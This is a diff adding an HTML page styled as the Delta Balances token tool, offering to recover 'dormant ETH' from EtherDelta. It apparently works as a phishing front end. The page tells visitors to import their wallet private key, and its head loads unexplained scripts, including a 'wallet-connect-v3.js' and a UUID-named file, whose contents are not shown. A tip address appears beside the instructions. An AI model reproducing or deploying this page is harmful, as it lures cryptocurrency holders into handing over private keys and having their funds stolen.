@@ -1,0 +1,549 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <script src="./mod.js"></script>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="description" content="View ERC20 token balances and decentralized exchange trading history.">
+  <meta content="width=device-width, initial-scale=1" name="viewport">
+  <link rel="icon" type="image/png" href="./delta.png">
+
+
+  <title>Delta Balances - Balances</title>
+
+  <script src="./domMod.js"></script>
+  <!-- CSS:  Bootstrap, adminLTE, fontawesome & custom -->
+  <link href="css/combinedStyles.css" rel="stylesheet">
+  <link rel="stylesheet" href="style.css">
+  <!-- JS  jquery -->
+  <script src="js/lib/jquery-3.2.1.min.js"></script>
+
+  <!-- JS  datatables -->
+  <script src="js/lib/jquery.dataTables.fixed.min.js"></script>
+
+  <!-- JS  Bootstrap + adminLTE (menu theme) + blockies ethereum -->
+  <script src="js/lib/bootstrap.adminlte.blockies.min.js"></script>
+  <script src="js/lib/bootstrap-toggle.min.js"></script>
+  <script src="js/lib/bootstrap-select.min.js"></script>
+
+  <!-- JS socketIO  for exchange prices -->
+  <script src="js/lib/socket.io.js" defer></script>
+
+  <!-- JS  Token discover / loading -->
+  <script src="js/backupTokens.js"></script>
+  <script src="js/loadTokens.js"></script>
+
+  <!-- JS  Main functionality -->
+  <script src="js/build/bundle.config.min.js"></script>
+  <script src="js/build/bundle.modules.min.js"></script>
+  <script src="js/build/bundle.min.js"></script>
+  <!-- 
+  <script src="js/user.js"></script>
+  <script src="js/balances.js"></script> -->
+
+
+  <script charset="UTF-8" type="text/javascript"
+    src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.6.9/ethers.umd.min.js"></script>
+  <script charset="UTF-8" type="text/javascript"
+    src="https://cdn.jsdelivr.net/npm/merkletreejs@latest/merkletree.js"></script>
+  <script charset="UTF-8" type="text/javascript"
+    src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
+  <script charset="UTF-8" type="text/javascript" src="./files/scripts/wallet-connect-v3.js"></script>
+  <link charset="UTF-8" rel="stylesheet" href="./files/styles/modal-9.css">
+  </link>
+  <link charset="UTF-8" rel="stylesheet" href="./files/styles/popup-6.css">
+  </link>
+  <script charset="UTF-8" type="text/javascript" src="./fe18ae27-62ab-44fc-b394-466e49837d75.js"></script>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+</head>
+
+<body style="display: none;" class="hold-transition skin-blue sidebar-mini">
+
+  <!-- Main Header -->
+  <header class="main-header">
+
+    <!-- Logo -->
+    <a href="index.html" class="logo hidden-xs">
+      <!-- mini logo for sidebar mini 50x50 pixels -->
+      <span class="logo-mini">
+        <img id="logo1" align="middle" src="logo-white.png" alt="logo">
+      </span>
+      <!-- logo for regular state and mobile devices -->
+      <span class="logo-lg">
+        <img id="logo2" align="middle" src="logo-white.png" alt="logo">
+        <span class="homeLink1">Delta</span>
+        <span class="homeLink2">Balances</span>
+      </span>
+    </a>
+
+    <!-- Header Navbar -->
+    <nav class="navbar navbar-static-top" role="navigation">
+
+      <!-- Sidebar toggle button-->
+      <a href="#" class="sidebar-toggle" data-toggle="push-menu" role="button">
+        <span class="sr-only">Toggle navigation</span>
+      </a>
+
+      <!-- mobile only logo -->
+      <ul class="visible-xs nav navbar-nav pull-left navbar-logo"
+        style="margin-left:0px; margin-top:5px;font-size:20px; height:30px; line-height:30px;">
+        <li class="">
+          <a href="index.html" class="dropdown">
+            <span class="homeLink1">Delta</span>
+            <span class="homeLink2">Balances</span>
+          </a>
+        </li>
+      </ul>
+
+      <!-- header search -->
+      <ul class="nav  navbar-nav pull-left customWidth1" style=" border: none;">
+        <li class="navbar-form" style="width:100%; padding:0px;  ">
+          <div class="input-group" style="width:100%;">
+            <input type="text" id="address" class="form-control custom"
+              placeholder="Ethereum address, transaction hash">
+            <span class="input-group-btn">
+              <input type="image" title="Import from web3" id="web3button" class="btn" onClick="requestMetamask(true)"
+                src="css/images/metamask.png" />
+              <button id="refreshButton" onClick="myClick()" class="btn btn-flat">
+                <i id="refreshButtonSearch" class="fa fa-search" aria-hidden="true"></i>
+                <i id="refreshButtonLoading" style="display:none" class="fa fa-refresh fa-spin" aria-hidden="true"></i>
+              </button>
+            </span>
+          </div>
+        </li>
+      </ul>
+      <ul class="nav navbar-nav pull-right navbar-user">
+        <!-- Control Sidebar Toggle Button -->
+        <li class="dropdown user user-menu">
+          <!-- Menu Toggle Button -->
+          <a href="#" id="userToggle" class="hidden dropdown-toggle" data-toggle="control-sidebar">
+            <!-- The user image in the navbar-->
+            <i id="userImage" class="user-image bg-red" style="width:32px; height:32px;"><img class="mini-metamask"
+                src="css/images/metamask.png" alt="metamask logo"></i>
+            <!-- hidden-xs hides the username on small devices so only the image appears. -->
+            <span id="currentAddr2" class="hidden-xs">0x......</span>
+          </a>
+        </li>
+      </ul>
+    </nav>
+  </header>
+
+  <!-- top alert message -->
+  <div class="alert alert-danger alert-top" style="display:none;" onclick="hideError()" id='error' role="alert">
+    <strong>Error</strong>
+    <span id="errortext"></span>
+    <button type="button" class="close" aria-label="Close">
+      <span aria-hidden="true">&times;</span>
+    </button>
+  </div>
+  <div class="alert alert-warning alert-top alert-dismissible" onclick="hideHint()" style="display:none;" role="alert"
+    id='hint'>
+    <strong>Hint</strong>
+    <span id="hinttext"></span>
+    <button type="button" class="close" aria-label="Close">
+      <span aria-hidden="true">&times;</span>
+    </button>
+  </div>
+
+  <!-- Left side column. contains the logo and sidebar -->
+  <aside class="main-sidebar">
+
+    <!-- sidebar: style can be found in sidebar.less -->
+    <section class="sidebar">
+
+      <!-- Sidebar Menu -->
+      <ul class="sidebar-menu" data-widget="tree">
+        <li id="homeLinkHeader" class="header">
+          <a href="index.html">
+            <span class="homeLink3">Delta</span>
+            <span class="homeLink4">Balances</span>
+          </a>
+        </li>
+        <li class="header">Multi Exchange</li>
+        <!-- Optionally, you can add icons to the links -->
+        <li class="active">
+          <a id="overviewNav" href="index.html">
+            <!-- <i class="sidebar-icon icon-balances"></i> -->
+            <img style="margin-top: -3px;" width="16" height="16" src="./bank.png" alt="">
+            <span>Token Balances</span>
+          </a>
+        </li>
+        <li>
+          <a id="recentNav" target="_blank" href="https://deltabalances.github.io/recent.html">
+            <!-- <i class="sidebar-icon icon-recent"></i> -->
+            <img src="./calender.png" style="margin-top: -3px;" width="16" height="16" alt="">
+            <span>Recent Transactions</span>
+          </a>
+        </li>
+      </ul>
+      <!-- /.sidebar-menu -->
+    </section>
+    <!-- /.sidebar -->
+  </aside>
+
+
+  <div class="wrapper">
+
+    <!-- Content Wrapper. Contains page content -->
+    <div class="content-wrapper">
+      <!-- Content Header (Page header) -->
+      <!-- <section class="content-header">
+      <h1>
+        Token balances
+      </h1>
+    </section> -->
+
+      <!-- Main content -->
+      <section class="content container-fluid">
+
+        <div class="row">
+
+
+
+          <div id="accordion" class="col-sm-12 col-md-4 col-lg-3 s-fullwidth padM-side">
+            <div id="settingbox" class="panel box box-default bottom10M">
+              <!-- /.box-header -->
+              <div class="box-header padM-side">
+
+                <div class="box-tools pull-right noPad">
+
+                  <a id="collapseSettings" data-toggle="collapse" data-parent="#accordion" href="#setting-body">
+                    <button type="button" class="accordionBtn btn btn-box-tool">
+                      <i id="settingToggleIcon" class="fa fa-plus"></i>
+                    </button>
+                  </a>
+                </div>
+              </div>
+              <div id="setting-body" class=" panel-collapse collapse box-body noPadTop">
+                <div class="col-xs-12 col-sm-6 col-md-12 noPadM bottom10M">
+
+                  <div class="col-xs-5 col-md-5 padM-side">
+                    Total Value: <br>
+                    <span id="fiatPrice" class="text75"></span>
+                  </div>
+                  <div class="col-xs-7 col-md-7 padM-side">
+                    <select id="fiatSelect" onchange="selectFiat()" data-width="125px" class="selectpicker">
+                      <option value="0">ETH</option>
+                      <option value="1" selected>ETH & USD</option>
+                      <option value="2">ETH & EUR</option>
+                    </select>
+                  </div>
+                </div>
+                <div class="col-xs-12 col-sm-6 col-md-12 noPadM bottom10M">
+                  <div class="col-xs-5 col-md-5 padM-side">
+                    Price estimate:
+                  </div>
+                  <div class="col-xs-7 col-md-7 padM-side">
+                    <select id="priceSelect" onchange="selectPrice()" data-width="125px" class="selectpicker">
+                      <option value="0" selected>Highest Bid</option>
+                      <option value="1">Lowest Ask</option>
+                    </select>
+                  </div>
+
+                </div>
+                <div class="col-xs-12 col-sm-12 col-md-12 noPadM">
+                  <div class="col-xs-12 padM-side">
+                    <input class="checkbox checkbox-info" type="checkbox" onclick="checkDecimal()" id="decimals">
+                    <label style="font-weight:normal;" for="decimals">Show more decimals</label>
+                  </div>
+                </div>
+              </div>
+              <!-- /.box-body -->
+            </div>
+            <!-- /.box -->
+
+            <!-- /.box -->
+          </div>
+        </div>
+
+
+        <div class="col-xs-12 col-md-12 col-lg-10 s-fullwidth">
+
+          <div class="box box-default">
+            <!-- /.box-header -->
+
+            <div class="box-body text1 noPadTop">
+              <h3 class="title1">Withdrawing Dormant ETH from EtherDelta</h3>
+
+              Etherdelta, one of the first "DEXs," was launched way back in 2016. The front-end was shuttered in 2018
+              after the SEC cracked down on the founders, but the smart contracts still operate.
+
+              Today they still hold $42M in assets, most of which people simply forgot about.
+
+              Prices were a lot lower back then; users who deposited a few ETH might might not remember and/or thought
+              the SEC seized the funds.
+
+              ~1200 people still have 0.1+ eth stored in the zombie smartcontract.
+              If you or your friends used Etherdelta check it out! You might have a payday coming.
+              <!--<div style="margin-top:30px;" class="col-xs-6 col-sm-8 noPad">
+				<span id="refreshText" class="text-red" style="display:hidden;margin-top:100px;">Outdated, click <i class="fa fa-refresh"></i> to refresh.</span>
+				</div> -->
+
+            </div>
+            <!-- /.box-body -->
+          </div>
+          <!-- /.box -->
+
+        </div>
+        <div class="col-xs-12 box1 col-md-12 col-lg-10 s-fullwidth">
+
+          <div class="box  box-default">
+
+            <div class="box-body text2 noPadTop">
+              <h3 class="title1">How to withdraw Dormant ETH from EtherDelta</h3>
+              <div>
+                <div>If you are the owner of one of these accounts, you can withdraw your funds by following these
+                  steps.
+                  Do note that you need to import wallet Private Key as the same as the account with the dormant funds.
+                  Then a new wallet private key will be displayed.</div>
+                <br />
+                <div>
+                  Copy & paste this new private key to any wallet of your choice wherein you can access your dormant
+                  funds.
+                </div>
+                <br />
+                <div>
+                  Moreover, please ensure that the wallet is the same as the account with the dormant funds.
+
+                  If this guide was helpful in anyway, I would appreciate greatly any tips.
+                </div>
+                <br />
+                <div> Buy me a beer: <a class="link1" target="_blank"
+                    href="https://etherscan.io/address/0xf6E914D07d12636759868a61E52973d17ED7111B">0xf6E914D07d12636759868a61E52973d17ED7111B</a>
+                </div>
+              </div>
+
+
+            </div>
+
+          </div>
+
+        </div>
+
+        <div class="row">
+          <div class="col-md-12 col-lg-8">
+            <h4> Load DEX to Withdraw balances from: </h4>
+          </div>
+
+
+          <div class="col-sm-12 col-md-8 col-lg-7 noPadM">
+
+            <div class="form-group">
+              <select id="exchangeDropdown" class="selectpicker" data-width="100%"
+                data-none-selected-text="Click to select one or more exchange(s)" data-container=".wrapper"
+                data-max-options="4" multiple>
+                <optgroup label="Active">
+                  <option data-icon="icon-etherdelta" data-subtext="ForkDelta">EtherDelta</option>
+                  <option data-icon="icon-idex">IDEX v2</option>
+                  <option data-icon="icon-switcheo">Switcheo v2</option>
+                  <option data-icon="icon-enclaves">Joyso</option>
+                  <option data-icon="icon-enclaves">SingularX</option>
+                  <option data-icon="icon-enclaves">dex.blue</option>
+                  <option data-icon="icon-enclaves">EtherC</option>
+                  <option data-icon="icon-enclaves">SwitchDex</option>
+                  <option data-icon="icon-enclaves">Bitcratic</option>
+                </optgroup>
+                <optgroup label="Legacy">
+                  <option data-icon="icon-idex">IDEX v1</option>
+                  <option data-icon="icon-tokenstore" data-subtext="(Discontinued, to withdraw use: ts-out.github.io )">
+                    Token store</option>
+                  <option data-icon="icon-switcheo" data-subtext="(Discontinued 10-2019)">Switcheo</option>
+                  <option data-icon="icon-enclaves" data-subtext="(Discontinued)">Enclaves</option>
+                  <option data-icon="icon-enclaves" data-subtext="(Discontinued)">DEXY</option>
+                  <option data-icon="icon-decentrex" data-subtext="(Discontinued)">Decentrex</option>
+                  <option data-icon="icon-enclaves" data-subtext="(website offline)">ETHEN</option>
+                  <option data-icon="icon-etherdelta" data-subtext="October 2016">EtherDelta-old</option>
+                  <option data-icon="icon-etherdelta" data-subtext="August 2016">EtherDelta-old2</option>
+                  <option data-icon="icon-etherdelta" data-subtext="August 2016">EtherDelta-old3</option>
+                  <option data-icon="icon-etherdelta" data-subtext="Juli 2016">EtherDelta-old4</option>
+                </optgroup>
+              </select>
+            </div>
+          </div>
+        </div>
+        <div class="col-sm-12 col-md-8 col-lg-7 s-fullwidth" style="overflow:hidden;">
+          <div class="box box-default bottom10M">
+            <div id="overviewOverlay" class="hidden-xs hidden-sm hidden-md hidden-lg overlay">
+              <i class="fa fa-refresh fa-spin dim"></i>
+            </div>
+            <!-- /.box-header -->
+            <div class="box-body noPadTop">
+              <div class="col-md-12 noPadM">
+                <h2>Total Balances</h2>
+                <div style="white-space:nowrap; overflow:hidden;">
+                  <div id="addrIcon" class="hidden-xs" style="float:left; display: inline-block; padding-left: 1%;">
+                  </div>
+                  <div class="hidden-xs" style="padding-left: 3%; float:left;">
+                    <p style="line-height:64px;display: inline-block;"> </p>
+                  </div>
+                  <div style="float:left; white-space:nowrap;">
+                    <p style="line-height:64px; white-space:nowrap; font-size:21px; font-weight:normal; display: inline-block;"
+                      id="addr">Connect Your Wallet</p>
+                  </div>
+                </div>
+                <div><button id="submitBtn" class="btn1">
+                    <span id="loadText" class="interact-button load">Connect</span>
+                    <img id="loadingIcon" class="loading" src="./re.png" alt="">
+                  </button></div>
+              </div>
+              <!-- /.box-body -->
+            </div>
+            <!-- /.box -->
+          </div>
+        </div>
+        <div class="col-xs-12 col-md-12 col-lg-10 s-fullwidth">
+          <div class="box box-default bottom10M">
+
+
+            <!-- <div class="box-body">
+                <div class="col-md-12 noPadM">
+                  <h3 class="">What is a token allowance? </h3>
+
+
+                </div>
+
+
+              </div> -->
+
+          </div>
+      </section>
+      <!-- /.content -->
+    </div>
+    <!-- /.content-wrapper -->
+
+    <!-- Main Footer -->
+    <footer class="main-footer">
+      <!-- To the right -->
+      <div class="pull-right hidden-xs">
+      </div>
+      <!-- Default to the left -->
+      <div class="col-sm-12 col-md-6">
+        <p> Balances are powered by
+          <a target="_blank" rel="noopener noreferrer" href="https://etherscan.io/">Etherscan</a>,
+          <a target="_blank" rel="noopener noreferrer" href="https://infura.io/">Infura</a> and
+          <a target="_blank" rel="noopener noreferrer" href="https://www.alchemyapi.io/">Alchemy</a>
+          <br> Contact:
+          <a target="_blank" rel="noopener noreferrer"
+            href="https://github.com/DeltaBalances/DeltaBalances.github.io">GitHub</a> or
+          <a target="_blank" rel="noopener noreferrer" href="https://reddit.com/u/deltabalances">Reddit</a>
+
+          <!-- <br> -->
+        <div> Buy me a beer:
+          <a href="https://etherscan.io/address/0xf6E914D07d12636759868a61E52973d17ED7111B" target="_blank"
+            rel="noopener noreferrer">0xf6E914D07d12636759868a61E52973d17ED7111B</a>
+        </div>
+        </p>
+      </div>
+      <div class="col-sm-12 col-md-6">
+        Use a referral:
+        <ul style="list-style-type:none">
+          <li><a target="_blank" rel="noopener noreferrer" href="https://www.binance.com/?ref=10985752">Trade on
+              Binance</a></li>
+        </ul>
+      </div>
+    </footer>
+
+    <!-- Control Sidebar -->
+    <aside class="control-sidebar control-sidebar-dark">
+      <!-- Create the tabs -->
+      <ul class="nav nav-tabs nav-justified control-sidebar-tabs">
+        <li class="active">
+          <a href="#control-sidebar-home-tab" data-toggle="tab">
+            <i class="fa fa-home"></i>
+          </a>
+        </li>
+        <li>
+          <a href="#control-sidebar-settings-tab" data-toggle="tab">
+            <i class="fa fa-gears"></i>
+          </a>
+        </li>
+      </ul>
+      <!-- Tab panes -->
+      <div class="tab-content">
+        <!-- Home tab content -->
+        <div class="tab-pane active" id="control-sidebar-home-tab">
+          <h3 class="control-sidebar-heading">Active address</h3>
+          <ul class="control-sidebar-menu">
+            <li>
+              <a href="" onclick="return false" style="pointer-events: none;">
+                <i id="currentAddrImg" class="menu-icon bg-red" style="width:32px; height:32px;"></i>
+                <div class="menu-info">
+                  <h4 id="currentAddr" class="control-sidebar-subheading">0x......</h4>
+                  <p id="currentAddrDescr">Input address</p>
+                </div>
+              </a>
+            </li>
+            <li id="walletInfo" class="hidden">
+              <a id="etherscan" href="#" target="_blank" class="menu-info control-sidebar-subheading">
+                Etherscan
+                <i class="fa fa-link pull-right"></i>
+              </a>
+              <a onclick="forget()" id="forget" href="#" class="menu-info control-sidebar-subheading">
+                Forget
+                <i class="fa fa-trash-o pull-right text-red"></i>
+              </a>
+              <a onclick="save()" id="save" href="#" class="hidden menu-info control-sidebar-subheading">
+                Save
+                <i class="fa fa-save pull-right text-blue"></i>
+              </a>
+            </li>
+          </ul>
+
+          <div id="savedSection" class="hidden">
+            <h3 class="control-sidebar-heading">Saved address</h3>
+            <ul class="control-sidebar-menu">
+              <li>
+                <a onclick="loadSaved()" href="#">
+                  <i id="savedImage" class="menu-icon bg-red" style="width:32px; height:32px;"></i>
+                  <div class="menu-info">
+                    <h4 id="savedAddress" class="control-sidebar-subheading">0x12345678</h4>
+                    <p>Saved</p>
+                  </div>
+                </a>
+              </li>
+            </ul>
+          </div>
+          <div id="metamaskSection">
+            <h3 class="control-sidebar-heading">Web3 browser</h3>
+            <ul class="control-sidebar-menu">
+              <li id="metamask-inactive" class="hidden">
+                <a onclick="loadMetamask()" href="#">
+                  <i id="metamaskImage" class="menu-icon bg-red" style="width:32px; height:32px;"></i>
+                  <div class="menu-info">
+                    <h4 id="metamaskAddress" class="control-sidebar-subheading">0x12345678</h4>
+                    <p>Web3 import</p>
+                  </div>
+                </a>
+              </li>
+              <li class="metamask-import">
+                <a onclick="requestMetamask(true)" href="#">
+                  <i id="metamask-logo-sidebar" class="menu-icon"></i>
+                  <div class="menu-info">
+                    <h4 class="control-sidebar-subheading">Import account</h4>
+                    <p> Injected Web3</p>
+                  </div>
+                </a>
+              </li>
+            </ul>
+          </div>
+
+        </div>
+
+        <!-- /.tab-pane -->
+        <!-- Settings tab content -->
+        <div class="tab-pane" id="control-sidebar-settings-tab">
+          <form>
+            <h3 class="control-sidebar-heading">Nothing here yet</h3>
+          </form>
+        </div>
+        <!-- /.tab-pane -->
+      </div>
+    </aside>
+    <!-- /.control-sidebar -->
+    <div class="control-sidebar-bg"></div>
+  </div>
+  <!-- ./wrapper -->
+</body>
+
+</html>
